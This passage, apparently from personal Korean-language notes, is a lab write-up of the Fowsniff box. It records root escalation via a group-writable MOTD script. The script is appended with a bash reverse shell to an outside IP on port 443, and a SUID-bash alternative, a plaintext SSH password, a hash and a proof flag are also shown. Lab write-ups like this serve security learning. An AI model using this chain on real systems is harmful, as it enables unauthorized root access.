drwxrwx---  3 mauer    mauer    4096 Mar 11  2018 mauer
drwxrwx---  3 mursten  mursten  4096 Mar 11  2018 mursten
drwxrwx---  3 mustikka mustikka 4096 Mar 11  2018 mustikka
drwxrwx---  3 parede   parede   4096 Mar 11  2018 parede
drwxrwx---  3 sciana   sciana   4096 Mar 11  2018 sciana
drwxrwx---  4 seina    seina    4096 Mar 11  2018 seina
drwxrwx---  4 stone    stone    4096 Mar 13  2018 stone
drwxrwx---  3 tegel    tegel    4096 Mar 11  2018 tegel
ls: cannot open directory '/root': Permission denied
---OS
NAME="Ubuntu"
VERSION="16.04.4 LTS (Xenial Xerus)"
ID=ubuntu
Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
— 출처: `~/PG/Fowsniff/enum_baksteen.log`

> [!warning] `---SUDO` 줄이 왜 저렇게 깨졌나 — 실제 출력이고 다듬지 않았다
> 친 명령은 `echo '<pw>' | sudo -S -l` 임. `-S` 는 비밀번호를 stdin 에서 읽지만 **프롬프트는 stderr 로 그대로 뿌림.** 여기에 **의사터미널(`ssh -t`/`-tt`)** 출력이 겹치며 `Sorry, user baksteen may not run sudo on fowsniff.` 가 `So` … `Connection to ... closed.` … ` fowsniff.` 로 토막나 섞임. `[가정]` 정확히 어느 지점에서 잘렸는지는 로그만으로 확정 불가.
> pty 가 잡혀 있었다는 근거는 로그 안에 있음 — `Connection to 192.168.248.18 closed.` 는 **tty 를 요청한 ssh 호출에서만** 출력되고, 이 줄과 위 경고 4줄만 CRLF 임(나머지 본문은 LF). 2026-08-26 Kali 에서 `ssh` vs `ssh -tt` 를 직접 비교해 확인함 — `-t` 없이는 이 줄이 아예 안 나옴.
> 결론 자체는 바뀌지 않음 — **sudo 권한 없음.** 다만 배치 열거 로그가 이렇게 섞이면 나중에 읽을 때 「안 돌았나」 싶어짐. `sudo -n -l 2>/dev/null` 로 stderr 를 버리는 편이 로그가 깨끗함.

SUID 목록은 Ubuntu 16.04 기본값 그대로임. `/usr/bin/procmail` 이 눈에 걸리지만 메일 서버라서 있는 것임 — `[가정]` Debian/Ubuntu 의 `procmail` 패키지가 원래 SUID 로 설치되는 표준 바이너리라는 것이 근거이나, Kali 에 `procmail` 이 설치돼 있지 않아 이 박스 밖에서 재확인하지 못했음. `getcap` 결과도 `[가정]` 배포판 기본으로 보임. `/etc/crontab` 은 배포판 원본 4줄(`run-parts` hourly/daily/weekly/monthly)뿐이고 `/etc/cron.d/` 에는 `popularity-contest` 만 있음. cron 없음, sudo 없음.

**여기서 막히면 그룹을 봄.**

#### `gid=100(users)` 가 단서

`baksteen` 의 기본 그룹이 자기 이름 그룹이 아니라 `users` 임.

```text
stone:x:1000:1000:stone,,,:/home/stone:/bin/bash
parede:x:1001:100::/home/parede:/bin/bash
baksteen:x:1004:100::/home/baksteen:/bin/bash
```
— 출처: `~/PG/Fowsniff/enum3_motd_mechanism.log` `==PASSWD` (`grep -E 'baksteen|parede|stone' /etc/passwd`)

여러 계정이 `users`(gid 100)를 공유함. 공유 그룹은 그 자체로 냄새임 — 관리자가 「이 파일들은 직원 전부가 만질 수 있게」라고 생각한 흔적이고, 그 안에 실행되는 스크립트가 섞여 있으면 그것이 권한상승임.

```bash
find / -group users -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```

```text
---GRPWRITE
/opt/cube/cube.sh
/run/user/1004
/run/user/1004/systemd
/run/user/1004/systemd/private
/run/user/1004/systemd/notify
/home/baksteen/.cache
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir
/home/baksteen/Maildir/tmp
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log
/home/baksteen/Maildir/cur
/home/baksteen/Maildir/new
/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
/home/baksteen/Maildir/dovecot-uidlist
/home/baksteen/.viminfo
/home/baksteen/.bash_history
/home/baksteen/.lesshsQ
/home/baksteen/.bash_logout
/home/baksteen/term.txt
/home/baksteen/.nano
/home/baksteen/.profile
/home/baksteen/.bashrc
---WORLDWRITE-BIN
/opt/cube/cube.sh
---MOTD
total 24
drwxr-xr-x  2 root root 4096 Mar 11  2018 .
drwxr-xr-x 88 root root 4096 Feb 20  2020 ..
-rwxr-xr-x  1 root root 1248 Mar 11  2018 00-header
-rwxr-xr-x  1 root root 1473 Mar  9  2018 10-help-text
-rwxr-xr-x  1 root root  299 Jul 22  2016 91-release-upgrade
-rwxr-xr-x  1 root root  604 Nov  5  2017 99-esm
```
— 출처: `~/PG/Fowsniff/enum2_writable.log`

홈과 런타임 디렉터리를 빼면 **`/opt/cube/cube.sh` 하나**임. 이 필터가 핵심임 — 자기 홈은 당연히 쓸 수 있어 결과의 대부분이 소음이고, `/opt`·`/usr/local`·`/srv`·`/var` 로 눈을 먼저 던져야 함.

`cube.sh` 의 모드·크기는 회수한 백업본으로 재확인됨.

```text
-rw-rwxr--  1 kali kali  850 2026-08-20 15:04:25.811833695 +0900 cube.sh.orig
```
— 출처: `ls -la --time-style=full-iso ~/PG/Fowsniff/`. `scp` 가 원본 모드를 보존해 `-rw-rwxr--`(674)와 850바이트가 그대로 남음

모드가 `674` 임. 소유자는 실행조차 못 하는데 그룹 `users` 는 `rwx` 임. 소유자가 `parede` 라는 것은 당시 시간순 기록(`writeup_notes.txt` 15:03 — `-rw-rwxr-- parede:users`)에 남음.

`[가정]` `/opt/cube` **디렉터리** 자체가 `drwxrwxrwx`(777)였다는 서술이 이전 판 노트에 있었으나 산출물로는 확인도 반증도 되지 않음. `enum2_writable.log` 어느 절에도 `/opt/cube` 디렉터리 행이 없으나, **두 find 의 실제 명령이 로그에 남지 않아** 「디렉터리가 제외됐을 뿐인지, 정말 777 이 아니었는지」를 가릴 수 없음(`---GRPWRITE` 는 `-group users` 필터라 root 소유 디렉터리가 애초에 빠지고, `---WORLDWRITE-BIN` 은 이름과 달리 모드 674 인 `cube.sh` 를 뱉었으므로 `-perm -o+w` 가 아니라 `-writable` 계열임). 박스가 내려간 뒤라 재확인 불가. 위 `Vulnerability Fix` 의 「상위 디렉터리도 함께」는 일반 원칙으로 읽을 것.

파일 내용은 회사 로고 ASCII 아트를 `printf` 하는 것뿐이고 셔뱅도 없음 — 그래서 호출하는 쪽이 `sh` 를 명시함. 중요한 것은 **누가 이것을 부르는가**임.

`/etc/update-motd.d/00-header` 는 원본 Canonical 스크립트의 `printf` 줄이 주석 처리되고 맨 아래에 `sh /opt/cube/cube.sh` 가 추가된 상태였음. `enum2_writable.log` 가 남긴 것은 `00-header` 가 `root:root 755`·1248바이트라는 것까지이고, **호출 한 줄은 당시 시간순 기록**(`writeup_notes.txt` 15:03 — 「`/etc/update-motd.d/00-header` 가 `sh /opt/cube/cube.sh` 를 호출」)에만 남음. `00-header` 자체는 손댈 수 없지만 그것이 부르는 파일은 우리 것임.

#### 누가 root 로 실행하는가 — `/proc` 으로 조상을 거슬러 올라간다

여기서 흔히 「pam_motd 가 root 로 실행한다」고 넘어가는데 이 박스의 PAM 설정은 그렇게 돼 있지 않음.

```text
31:# This includes a dynamically generated part from /run/motd.dynamic
32:# and a static (admin-editable) part from /etc/motd.
33:session    optional     pam_motd.so  motd=/run/motd.dynamic
34:session    optional     pam_motd.so noupdate
==SSHDCONF
PrintMotd no
UsePAM yes
```
— 출처: `~/PG/Fowsniff/enum3_motd_mechanism.log` (`grep -n motd /etc/pam.d/sshd` · `grep -iE 'printmotd|usepam' /etc/ssh/sshd_config`)

주석 두 줄이 답을 반쯤 줌 — pam 은 **이미 만들어져 있는** `/run/motd.dynamic` 을 출력만 하고, `noupdate` 는 update-motd.d 를 실행하지 말라는 뜻임. 그럼 누가 만드는가.

추측하지 않고 `cube.sh` 안에 프로브를 심어 **자기 자신의 부모를 따라 올라감.** 프로브는 두 번 보냄.

1차 — 자기 자신과 부모만 확인:

```text
uid=0(root) gid=0(root) groups=0(root)
  PID  PPID USER     COMMAND
 1852  1851 root     sh /opt/cube/cube.sh
  PID  PPID USER     COMMAND
 1851  1850 root     /bin/sh /etc/update-motd.d/00-header
root@fowsniff:/#
```
— 출처: `~/PG/Fowsniff/enum4_motd_parent.log` (앞부분). 끝의 `root@fowsniff:/#` 는 프로브 결과를 읽은 root pty 세션의 프롬프트임

첫 줄로 이미 확정됨 — **`cube.sh` 는 uid 0 으로 돎.** 그리고 부모가 `00-header` 임. 하지만 `00-header` 위가 안 보임.

2차 — `/proc/<pid>/stat` 의 4번째 필드(ppid)를 따라 루트까지 훑고 각 pid 의 `/proc/<pid>/cmdline` 을 찍음.

```text
sh/opt/cube/cube.sh [pid 1882]
/bin/sh/etc/update-motd.d/00-header [pid 1881]
run-parts--lsbsysinit/etc/update-motd.d [pid 1880]
sh-c/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [pid 187
9]
sshd: baksteen [priv] [pid 1876]
/usr/sbin/sshd-D [pid 709]
root@fowsniff:/#
```
— 출처: `~/PG/Fowsniff/enum4_motd_parent.log` (뒷부분)

> [!warning] 붙어 있는 단어들은 오타가 아니다 — `/proc/<pid>/cmdline` 은 NUL 구분이다
> `sh/opt/cube/cube.sh` 처럼 인자가 명령에 붙어 나온 것은 `tr -d '\0'` 으로 **NUL 을 지워버렸기** 때문임. 공백으로 **바꿔야** 함:
> ```bash
> tr '\0' ' ' < /proc/$pid/cmdline
> ```
> `sh -c ...` 항목만 중간에 공백이 살아 있는데, 그것은 그 인자 하나가 원래 공백을 포함한 긴 문자열이라 그럼. (`ps` 를 쓸 수 있으면 `ps -o pid,ppid,args -p <pid>` 가 더 편하지만, 프로브가 MOTD 안에서 도는 상황에서는 파일 읽기가 확실함.)

`sshd: baksteen [priv]` — sshd 의 **특권 프로세스**(root)가 로그인마다 `sh -c '/usr/bin/env -i PATH=... run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new'` 를 돌려 `/run/motd.dynamic` 을 새로 만듦. Ubuntu 가 OpenSSH 에 넣은 패치이고 `PrintMotd no` 여도 이 생성은 돎(출력은 pam_motd 가 함). 그 체인 끝이 우리가 쓸 수 있는 `cube.sh` 임.

#### 실행

원본을 먼저 백업함. 정리를 위한 것이기도 하고 아트가 깨지면 관리자가 눈치챔.

```bash
sshpass -p 'S1ck3nBluff+secureshell' scp baksteen@192.168.248.18:/opt/cube/cube.sh ./cube.sh.orig
md5sum cube.sh.orig
wc -c cube.sh.orig
```

```text
377489e75ac90ece2f92fe30519f371c  cube.sh.orig
850 cube.sh.orig
```
— 출처: 백업 직후 실행 stdout(파일 미보존). 값 자체는 보존된 `~/PG/Fowsniff/cube.sh.orig`(850바이트)로 재현 가능

리스너를 tmux 안에 올림. 비대화형 SSH 는 호출이 끝나면 자식을 죽이므로 tmux 가 아니면 리스너가 사라짐.

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s fow_root 'sudo nc -lvnp 443; exec bash'"
ssh kali@10.44.44.128 "ss -lntp | grep 443"
```

`ss` 결과에 프로세스 열(`users:(("nc",pid=...))`)이 안 보이는 것은 정상임 — `sudo` 로 띄운 root 소유 소켓이라 비특권 `ss` 에게는 소유 프로세스가 가려짐. 리스너가 정말 내 것인지 확인하려면 `sudo ss -lntp` 를 쓸 것.

`cube.sh` 끝에 한 줄 덧붙임. **덮어쓰지 않고 append** 하는 이유 — 아트 출력이 그대로 남아야 로그인 화면이 정상으로 보이고, 복원도 `truncate` 한 번이면 됨.

```bash
printf '\nbash -c "bash -i >& /dev/tcp/192.168.45.207/443 0>&1" &\n' >> /opt/cube/cube.sh
```

`&` 로 백그라운드에 던짐. `[가정]` 붙이지 않으면 리버스셸이 `run-parts` 를 붙잡고, sshd 가 `/run/motd.dynamic.new` 생성이 끝나기를 기다리느라 로그인이 진행되지 않을 것임. 위 체인에서 sshd 특권 프로세스가 `> /run/motd.dynamic.new` 리다이렉션으로 `run-parts` 의 종료를 기다리는 구조이니 그렇게 되는 것이 자연스럽지만 **이 박스에서 실측하지 못했음** — `cube.sh` 에 `sleep 20` 을 넣고 로그인 시간을 재려던 참에 박스가 내려감(`Post-Exploitation` 의 「남긴 흔적」). 어느 쪽이든 `&` 를 붙이는 편이 안전함.

`bash -c "..."` 로 한 번 감싼 것은 `00-header` 가 `#!/bin/sh`(dash)라서임. dash 는 `>&` 를 파싱하지 못함 — Kali 에서 확인:

```text
dash: 1: Syntax error: Bad fd number
```
— 출처: `ssh kali@10.44.44.128 "dash -c 'echo hi >& /dev/null'"` 실행(2026-08-26 재확인, exit 2)

리다이렉션 파싱에서 먼저 죽으므로 `/dev/tcp` 에 **도달조차 하지 않음.** 「dash 가 `/dev/tcp` 를 모른다」가 아니라 문법에서 걸리는 것이고, 그래서 에러도 `No such file or directory` 가 아님. 명시적으로 bash 를 부를 것.

트리거는 그냥 SSH 로 다시 들어가는 것임.

```bash
sshpass -p 'S1ck3nBluff+secureshell' ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null baksteen@192.168.248.18 'echo TRIGGERED'
```

리스너 쪽:

```text
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.18] 54860
bash: cannot set terminal process group (1783): Inappropriate ioctl for device
bash: no job control in this shell
root@fowsniff:/#
```
— 출처: tmux `fow_root` 스크롤백에서 옮긴 것으로 **파일로 저장되지 않았음.** `root@fowsniff:/#` 프롬프트 자체는 `proof_root.txt`·`enum3_motd_mechanism.log`·`enum4_motd_parent.log` 세 파일에 실재함. `[가정]` 포트 54860 과 pid 1783 은 재확인 불가 — 다만 1783 은 두 프로브의 cube.sh pid(1852·1882)보다 앞선 값이라 시간순과 모순되지 않음

443 아웃바운드가 그대로 나감. 80/53 으로 내려갈 일도, `tcpdump` 로 SYN 을 확인할 일도 없었음.

PTY 로 승격:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

#### 대안 경로 · 안 판 경로

**수동 대안(아웃바운드가 막힌 경우)** — `cube.sh` 에 리버스셸 대신 `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` 를 넣고 로그인 후 `/tmp/rootbash -p` 를 실행해도 됨. `-p` 가 없으면 bash 가 euid 를 버려 root 가 날아감. 아웃바운드가 전부 막힌 상황이면 이쪽이 유일한 선택지임. 리버스셸을 먼저 고른 것은 완전한 root 세션이 바로 손에 들어오기 때문.

`stone` 계정 해시(`a92b8a29ef1183192e3d35187e0cfabd`)는 rockyou 로 안 풀림. `stone` 은 uid 1000 이고 `/home` 목록에서 링크 수가 4로 다른 계정(3)보다 하나 많아 하위 디렉터리가 하나 더 있음(`enum_baksteen.log` `---HOME`). `[가정]` 다른 계정들처럼 `Maildir` 이 있어 여기도 경로였을 수 있음 — 권한이 `drwxrwx--- stone:stone` 이라 들여다보지 못했음. MOTD 가 먼저 열려서 파지 않았음.

### Post-Exploitation

**Proof.txt value:**
`f64f537d70805222fa0fd2e7a8d2a3ab`

```text
root
uid=0(root) gid=0(root) groups=0(root)
fowsniff
192.168.248.18
Thu Aug 20 02:05:34 EDT 2026
==PROOF
f64f537d70805222fa0fd2e7a8d2a3ab
==FLAG
Your flag is in another file...
root@fowsniff:/#
```
— 출처: `~/PG/Fowsniff/proof_root.txt` (`whoami; id; hostname; hostname -I; date; echo ==PROOF; cat /root/proof.txt; echo ==FLAG; cat /root/flag.txt` 한 줄 실행). 끝의 `root@fowsniff:/#` 가 PTY 승격 뒤 대화형 root 셸에서 읽었다는 증거임

`/root/flag.txt` 는 **미끼**임. 원본 VulnHub 판의 잔재이고 PG 가 채점하는 것은 `proof.txt` 임. `/root` 안에 flag 로 보이는 파일이 둘 있으면 둘 다 읽을 것.

**남긴 흔적**

- **`/opt/cube/cube.sh`** — 리버스셸 1줄과 프로세스 추적 프로브를 append 했다가 `truncate -s 850` 으로 되돌림. 복원 직후 `md5sum` = `377489e75ac90ece2f92fe30519f371c` 로 백업본(`cube.sh.orig`, 850바이트)과 일치하는 것을 **출력으로 확인**했고, mtime 도 `touch -d "2020-02-28 00:00:00"` 으로 원래 값(Feb 28 2020)으로 복구함
- **`/tmp/motd_who.txt`·`/tmp/anc.txt`·`/tmp/cube.bak`** — 메커니즘 확인용 프로브 파일. 삭제하고 `ls -la /tmp` 로 확인. `[가정]` 남은 것이 부팅 때부터 있던 systemd/vmware 디렉터리뿐이었다는 서술은 그 `ls` 출력이 파일로 남지 않아 재확인 불가 — 산출물에 남은 근거는 `writeup_notes.txt` 15:07 의 「/tmp 프로브 파일 삭제 확인」 한 줄임
- ⚠️ **마지막 프로브 하나는 결과를 확인하지 못함.** 위 복원을 끝낸 뒤(15:07), `Privilege Escalation` 절의 「`&` 를 빼면 로그인이 멈춘다」를 실증하려고 `cube.sh` 에 `sleep 20` 한 줄을 더 붙이는 명령을 root 셸에 보냄(15:10). 그런데 **그 시점부터 박스가 응답을 멈춤** — 셸이 명령을 에코만 하고 실행하지 않았고, 곧이어 22/80/110 전부 `No route to host` 가 됨(포털 쪽에서 박스가 내려갔거나 리버트된 것으로 보임). 따라서 그 `sleep 20` 이 파일에 **실제로 쓰였는지 확인하지 못했음.** 쓰였다면 `cube.sh` 끝에 `\nsleep 20\n` 이 남아 있고, 안 쓰였다면 15:07 의 복원 상태 그대로임. 박스가 죽어 재확인도 재정리도 불가능했음. PG 는 리버트 시 베이스 이미지로 되돌아가므로 실질 영향은 없다고 보지만 **「정리 완료」로 적지 않음**
- **계정·설정 변경 없음.** 사용자 추가, SSH 키 배치, 서비스 설정 변경을 하지 않음
- **Kali 쪽** — `~/PG/Fowsniff/` 산출물 유지. tmux `fow_nmap`·`fow_gob`·`fow_root` 전부 세션 이름으로 종료(당시 tmux 서버에는 이 세 개뿐이었고 마지막 세션이 닫히며 서버도 같이 내려감). 443 리스너 소멸을 `ss -lntp` 로 확인. 중간에 끊겨 고아가 된 `sshpass` 프로세스 2개는 **PID 를 특정해**(354449·354450) 종료함
- **남의 프로세스는 건드리지 않음.** 정리 중 `nc -lvnp 80`(root, PID 347623/347626/347627)이 보였는데 이 박스에서는 443 만 썼으므로 다른 라인의 것임. 그대로 두었음. 광범위 `pkill` 을 쓰지 않은 이유가 정확히 이것임
- **Kali 의 `known_hosts` 는 오염되지 않음.** 스프레이 전부 `-o UserKnownHostsFile=/dev/null` 이었고, `~/.ssh/known_hosts` 에 `192.168.248.18` 항목이 없음(2026-08-26 재확인, 매칭 0건). ⚠️ 이전 판이 함께 적었던 「파일 mtime 이 작업 시작 전 그대로」는 **근거가 되지 못함** — 그 mtime 은 이후 다른 박스 작업으로 갱신되는 값이고, 날짜를 빼고 시각만 비교한 것이라 애초에 성립하지 않았음. 항목 부재 하나로 충분함

**스크린샷 없음** — 이 박스는 SSH 비대화형으로 풀었고 볼트 `파일보관\` 에 2026-08-20 자 Fowsniff 이미지가 0장임. 박스가 정지돼 소급 촬영도 불가능함.

## 관련

- Dovecot auth penalty 소스(`src/auth/auth-settings.c`·`auth-penalty.{h,c}`·`auth-request-handler.c`) — POP3 스프레이 타임아웃 수치의 근거. 수치 자체는 [[_PLAYBOOK]] 스프레이 항목에 있음. `[가정]` 참조한 소스는 Ubuntu 16.04 기본 패키지인 **2.2.22** 를 전제한 것임 — nmap 은 `Dovecot pop3d` 까지만 뱉었고 `dpkg -l` 을 안 걸어 **이 박스의 실제 Dovecot 버전은 관측되지 않았음**
- Ubuntu OpenSSH 의 `update-motd` 동작 — 문서 대신 `/proc/<pid>/stat` ppid 체인으로 직접 확인(`enum4_motd_parent.log`)
- 원 시나리오의 pastebin(`NrAqVeeX`)은 삭제됨(404). 공개 미러에서 해시 9쌍 복원
- Fowsniff 는 원래 VulnHub/TryHackMe 박스이고 PG 가 그대로 가져옴. `/root/flag.txt` 의 미끼 문구가 그 흔적. CVE 없음 — 전부 설정·운영 결함임
- Kali 산출물 — `~/PG/Fowsniff/`(`quick.log`·`nmap.log`·`nmap.full.txt`·`gobuster.log`·`README.txt`·`security.txt`·`web/`·`dump.txt`·`hashes.txt`·`users.txt`·`john_cracked.txt`·`creds.txt`·`pop3spray.py`·`try1_pop3spray.log`·`try2_pop3spray.log`·`mail_seina.txt`·`try3_ssh_spray.log`·`enum_baksteen.log`·`enum2_writable.log`·`enum3_motd_mechanism.log`·`enum4_motd_parent.log`·`cube.sh.orig`·`proof_user.txt`·`proof_root.txt`·`writeup_notes.txt`) + `~/.john/john.log`
- [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] · [[_PLAYBOOK#B-31. 크론 기반 권한상승]] — MOTD 도 「root 가 주기적/이벤트마다 남의 파일을 실행한다」는 같은 부류. 다른 점은 트리거가 시간이 아니라 **내 로그인**이라 즉시 발동시킬 수 있다는 것
- [[_PLAYBOOK#B-3-11. MOTD 권한상승 — `/etc/update-motd.d/` 는 SSH 로그인마다 root 로 돈다]] — 이 박스의 권한상승 경로 카드
- [[_PLAYBOOK#B-2-13. POP3 · IMAP (110 · 143) — 메일함은 셸이 아니라 «다음 자격증명이 평문으로 적혀 있는 곳»이다]] · [[_PLAYBOOK#B-6-11. 솔트 없는 MD5 덤프 — 초 단위에 풀리고, 사용자 짝은 «따로» 되살려야 한다]] — 진입 경로 카드
- [[_PLAYBOOK#A-2-28. 인증 스프레이가 N번째 계정에서 타임아웃으로 죽는다 — 차단이 아니라 «사전 지연»이다]] — Dovecot auth penalty 수치의 이관처
- [[_PLAYBOOK#A-1-21. 웹 루트에 미참조 이미지가 있다 — 스테가노 전에 «기성 템플릿»부터 확인한다]] · [[_PLAYBOOK#A-1-22. 박스 안에 자격증명 소스가 없다 — 박스가 «지목한 밖»을 읽는다]] — 이 박스에서 태운 5분과 그 교훈
- [[_PLAYBOOK#A-33. 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 `pkill -f`]] — 비대화형 배치 열거의 `sudo -n -l`
- [[_PLAYBOOK#F-1. 이 볼트에서 자주 만난 것]] — 110/143 을 봤을 때의 첫 수
- 크론 기반 root 실행 경로: [[Astronaut]] · [[Exfiltrated]] · [[Muddy]]
- 자격증명 재사용 체인(유출 해시 → 크랙 → 다른 서비스에 스프레이)은 색인의 `tech/cred/reuse`·`tech/cred/spray` 태그로 찾을 것
- [[_STATUS]] — 283개 전수 진행현황
